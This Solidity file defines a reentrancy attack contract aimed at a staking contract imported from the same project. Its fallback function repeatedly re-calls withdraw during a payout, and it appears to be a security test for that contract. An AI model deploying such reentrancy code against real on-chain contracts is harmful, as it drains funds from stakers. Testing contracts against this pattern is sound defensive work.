// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./Staking.sol";

contract ReentrantAttack {
    Staking public staking;
    IERC20 public stakeToken;
    uint256 public poolId;
    uint256 public amount;

    constructor(Staking _staking, IERC20 _stakeToken, uint256 _poolId, uint256 _amount) {
        staking = _staking;
        stakeToken = _stakeToken;
        poolId = _poolId;
        amount = _amount;
    }

    function attack() external {
        stakeToken.approve(address(staking), amount);
        staking.deposit(poolId, amount);
        staking.withdraw(poolId); // Initial withdraw call
    }

    // Fallback function to be called during reentrancy
    fallback() external payable {
        if (address(staking).balance >= amount) {
            staking.withdraw(poolId); // Attempt reentrant withdraw
        }
    }
}
